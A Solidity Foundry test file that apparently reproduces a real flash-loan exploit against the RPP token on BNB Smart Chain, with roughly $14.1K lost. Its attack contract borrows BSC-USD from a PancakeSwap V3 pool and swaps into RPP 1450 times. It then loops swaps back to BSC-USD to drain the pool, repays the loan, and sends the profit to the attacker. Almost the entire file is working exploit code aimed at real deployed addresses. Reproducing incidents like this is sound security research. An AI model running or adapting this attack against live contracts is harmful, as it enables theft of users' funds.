// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~ $14.1K
// Attacker : https://bscscan.com/address/0x709b30b69176a3ccc8ef3bb37219267ee2f5b112
// Attack Contract : https://bscscan.com/address/0xfebfe8fbe1cbe2fbdcfb8d37331f2c8afd2a4b45
// Vulnerable Contract : https://bscscan.com/address/0x7d1a69302d2a94620d5185f2d80e065454a35751
// Attack Tx : https://bscscan.com/tx/0x76c39537374e7fa7f206ed3c99aa6b14ccf1d2dadaabe6139164cc37966e40bd

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x7d1a69302d2a94620d5185f2d80e065454a35751#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/TenArmorAlert/status/1853984974309142768
// Hacking God : N/A

address constant PANCAKE_V3_POOL = 0x36696169C63e42cd08ce11f5deeBbCeBae652050;
address constant PANCAKE_V2_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

address constant WBNB_ADDR = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant BSC_USD = 0x55d398326f99059fF775485246999027B3197955;
address constant RPP_TOKEN = 0x7d1a69302D2A94620d5185f2d80e065454a35751;

contract RPP_exp is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 43_752_882 - 1;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        // Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = BSC_USD;

        vm.label(PANCAKE_V3_POOL, "PancakeV3Pool");
        vm.label(PANCAKE_V2_ROUTER, "PancakeSwap: Router v2");

        vm.label(WBNB_ADDR, "WBNB");
        vm.label(BSC_USD, "BUSD");
        vm.label(RPP_TOKEN, "RPP");
    }

    function testExploit() public balanceLog {
        AttackContract attackContract = new AttackContract();
        attackContract.start();
    }

    receive() external payable {}
}

contract AttackContract {
    address attacker;
    uint256 borrowedAmount = 1_200_000_000_000_000_000_000_000;

    constructor() {
        attacker = msg.sender;
    }

    function start() public {
        TokenHelper.approveToken(BSC_USD, PANCAKE_V2_ROUTER, type(uint256).max);
        TokenHelper.approveToken(RPP_TOKEN, PANCAKE_V2_ROUTER, type(uint256).max);

        IPancakeV3PoolActions(PANCAKE_V3_POOL).flash(address(this), borrowedAmount, 0, "");

        TokenHelper.transferToken(BSC_USD, attacker, TokenHelper.getTokenBalance(BSC_USD, address(this)));
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        uint256 times = 1450; // 1450
        for (uint256 i = 0; i < times; i++) {
            address[] memory path = new address[](2);
            path[0] = BSC_USD;
            path[1] = RPP_TOKEN;
            IPancakeRouter(payable(PANCAKE_V2_ROUTER)).swapTokensForExactTokens(
                99_999_999_999_999_999_999_999,
                1_200_000_000_000_000_000_000_000,
                path,
                address(this),
                block.timestamp + 100_000_000
            );
        }

        while (true) {
            uint256 rppBalance = TokenHelper.getTokenBalance(RPP_TOKEN, address(this));
            address[] memory path = new address[](2);
            path[0] = RPP_TOKEN;
            path[1] = BSC_USD;
            IPancakeRouter(payable(PANCAKE_V2_ROUTER)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
                99_999_999_999_999_999_999_999, 0, path, address(this), block.timestamp + 100_000_000
            );
            if (rppBalance <= 134_160_000_000_000_000_000_000_214) break;
        }

        TokenHelper.transferToken(BSC_USD, PANCAKE_V3_POOL, borrowedAmount + fee0);
    }

    receive() external payable {}
}
